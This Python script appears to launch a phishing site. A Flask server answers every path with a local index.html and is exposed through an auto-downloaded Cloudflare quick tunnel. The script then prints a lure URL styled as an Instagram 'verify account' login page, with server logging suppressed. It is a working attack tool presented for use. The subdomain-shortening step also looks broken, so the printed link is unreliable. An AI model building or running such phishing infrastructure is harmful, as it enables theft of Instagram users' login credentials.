import os
import re
import sys
import shutil
import logging
import threading
import subprocess
import urllib.request
from flask import Flask, send_from_directory
import flask.cli

# Suppress Flask & Werkzeug server logging completely
flask.cli.show_server_banner = lambda *args: None
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__, static_folder=None)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def serve_all(path):
    """Serve static files (CSS, JS, images) or fallback to index.html for Instagram sentence URLs."""
    # Direct file match
    if path and os.path.isfile(path):
        return send_from_directory('.', path)
    
    # Check if basename matches a root file
    filename = os.path.basename(path)
    if filename and os.path.isfile(filename):
        return send_from_directory('.', filename)

    # Check assets directory
    if 'assets/' in path or path.startswith('assets'):
        asset_file = path.split('assets/')[-1]
        if os.path.isfile(os.path.join('assets', asset_file)):
            return send_from_directory('assets', asset_file)

    # Default to main webpage index.html
    return send_from_directory('.', 'index.html')

def run_flask():
    app.run(host='127.0.0.1', port=5000, debug=False)

def get_cloudflared_executable():
    """Locate or automatically download cloudflared executable."""
    cmd = shutil.which('cloudflared')
    if cmd:
        return cmd

    local_exe = os.path.join(os.getcwd(), 'cloudflared.exe')
    if os.path.isfile(local_exe):
        return local_exe

    # Auto-download cloudflared.exe for Windows if not present
    url = 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe'
    try:
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req) as response, open(local_exe, 'wb') as out_file:
            shutil.copyfileobj(response, out_file)
        return local_exe
    except Exception as e:
        sys.stderr.write(f"Failed to download cloudflared: {e}\n")
        return None

def main():
    # Start Flask server in background thread
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    cloudflared_bin = get_cloudflared_executable()
    if not cloudflared_bin:
        sys.exit(1)

    # Launch Cloudflare Quick Tunnel
    process = subprocess.Popen(
        [cloudflared_bin, 'tunnel', '--url', 'http://127.0.0.1:5000'],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1
    )

    url_found = False
    try:
        for line in process.stdout:
            match = re.search(r'https://([a-zA-Z0-9-]+)\.trycloudflare\.com', line)
            if match and not url_found:
                # Reduce subdomain before .trycloudflare.com to one single word
                full_subdomain = match.group(1)
                one_word = full_subdomain.split('-')[0]
                insta_url = f"https://{one_word}.trycloudflare.com/accounts/login/instagram-verify-account"
                print(insta_url, flush=True)
                url_found = True
        process.wait()
    except KeyboardInterrupt:
        process.terminate()

if __name__ == '__main__':
    main()
